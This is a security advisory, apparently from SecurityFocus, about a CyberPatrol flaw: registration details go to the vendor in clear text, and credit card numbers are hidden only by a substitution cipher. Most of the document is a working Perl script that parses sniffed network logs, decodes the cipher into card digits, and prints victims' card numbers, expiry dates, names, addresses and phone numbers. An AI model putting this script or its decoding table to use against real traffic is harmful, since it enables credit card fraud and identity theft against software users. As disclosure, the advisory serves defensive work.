source: http://www.securityfocus.com/bid/1977/info

CyberPatrol is popular web access restriction software by Microsys.

A vulnerability exists in the way CyberPatrol submits registration information from its client software to Microsys' backend (cybercentral.microsys.com) that could allow a remote attacker to gather confidential information including credit card details.

The client software claims that all information including credit card details are "scrambled" before being sent to Microsys' backend. Installation of a sniffer has shown that all information with the exception of the credit card number is actually sent in clear text to Microsys. A remote attacker could place a sniffer upstream from the sending client and gather confidential registration information in addition to the credit card number which is only protected by a substitution cypher (please see the original bugtraq message in the reference section for details on the cypher). Additionally, this information could be obtained by examining the log files of a proxy firewall. 

#!/usr/bin/perl

$showline=0;
open(SNORT, "log");
LINE:while($line=<SNORT>){
@field=split /\s/, $line;
if($#field>0 && $#field<15){next LINE;}
if(!($line=~/\w/)){
$registerinfo=~s/\%20/ /g;
$registerinfo=~s/\%40/@/g;
($junk, $registerinfo)=split /\.\.\.\./, $registerinfo;
@array=split /\&/, $registerinfo;
if($array[0]=~/EMAIL/){print "$array[0]\n";}

if($array[1]=~/CARD/){print "CARD=";}
@chararray=split //, $array[1];
$arraylength=$#chararray;
for($i=0; $i<$arraylength+1; ++$i){
if($chararray[$i]=~/\%/){
$checkchar="$chararray[$i]";
$checkchar.="$chararray[$i+1]";
$checkchar.="$chararray[$i+2]";
$i=$i+2;
}
else{$checkchar="$chararray[$i]";}

if($checkchar=~/z/){print "0";}
elsif($checkchar=~/{/){print "1";}
elsif($checkchar=~/x/){print "2";}
elsif($checkchar=~/y/){print "3";}
elsif($checkchar=~/\%7E/){print "4";}
elsif($checkchar=~/\./){print "5";}
elsif($checkchar=~/\|/){print "6";}
elsif($checkchar=~/\}/){print "7";}
elsif($checkchar=~/r/){print "8";}
elsif($checkchar=~/s/){print "9";}


}

if($array[2]=~/EXP/){print "\n$array[2]\n";}
if($array[3]=~/NAME/){print "$array[3]\n";}
if($array[4]=~/ADDR1/){print "$array[4]\n";}
if($array[5]=~/ADDR2/){print "$array[5]\n";}
if($array[6]=~/CITY/){print "$array[6]\n";}
if($array[7]=~/PHONE/){print "$array[7]\n\n\n";}

$registerinfo="";
$showline=0;
}
if($line=~/POST/){$showline=1}
if($showline eq 1){
($junk, $line)=split / /, $line;
chomp($line);
$registerinfo.=$line;
}
}